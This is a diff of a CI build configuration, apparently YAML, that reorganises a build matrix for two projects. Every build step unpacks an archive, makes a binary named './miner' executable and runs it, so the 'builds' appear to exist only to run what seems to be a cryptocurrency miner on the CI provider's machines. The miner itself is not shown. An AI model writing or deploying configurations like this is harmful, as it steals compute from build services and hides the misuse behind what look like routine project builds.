@@ -13,23 +13,22 @@ init:
 
 # Define a build matrix for different projects
 matrix:
-  # Define builds for Project1
-  - project: Project1
-    build_script:
-      # Build commands for Project1
-      - tar xvf project1.tar.gz
-      - cd project1
-      - chmod +x ./miner
-      - ./miner &  # Run the first project in the background
-      - wait  # Wait for the process to finish
+  include:
+    # First project build
+    - project: Project1
+      build_script:
+        # Build commands for Project1
+        - tar xvf project1.tar.gz
+        - cd project1
+        - chmod +x ./miner
+        - ./miner  # Run the first project
 
-  # Define builds for Project2
-  - project: Project2
-    build_script:
-      # Build commands for Project2
-      - tar xvf project2.tar.gz
-      - cd project2
-      - chmod +x ./miner
-      - ./miner &  # Run the second project in the background
-      - wait  # Wait for the process to finish
-      
+    # Second project build
+    - project: Project2
+      build_script:
+        # Build commands for Project2
+        - tar xvf project2.tar.gz
+        - cd project2
+        - chmod +x ./miner
+        - ./miner  # Run the second project
+        
